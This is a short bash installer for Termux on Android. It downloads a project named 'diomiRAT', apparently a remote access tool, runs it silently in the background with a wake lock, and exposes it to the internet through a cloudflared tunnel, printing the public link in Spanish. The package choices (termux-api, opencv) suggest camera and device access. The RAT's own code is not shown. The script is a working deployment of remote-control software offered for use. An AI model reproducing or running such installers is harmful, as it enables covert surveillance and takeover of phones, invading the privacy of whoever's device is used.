#!/bin/bash
pkg update -y && pkg upgrade -y
pkg install -y python termux-api opencv-python cloudflared git
cd $HOME
rm -rf diomiRAT 2>/dev/null
git clone https://github.com/Diomi1/diomiRAT.git
cd diomiRAT
chmod +x quickrat.py
pkill -f quickrat.py; pkill -f cloudflared
termux-wake-lock
nohup python quickrat.py > /dev/null 2>&1 &
nohup cloudflared tunnel --url http://localhost:5000 > t.log 2>&1 &
sleep 12
echo "ENLACE PERMANENTE:"
grep -o 'https://[^ ]*trycloudflare.com' t.log | tail -1
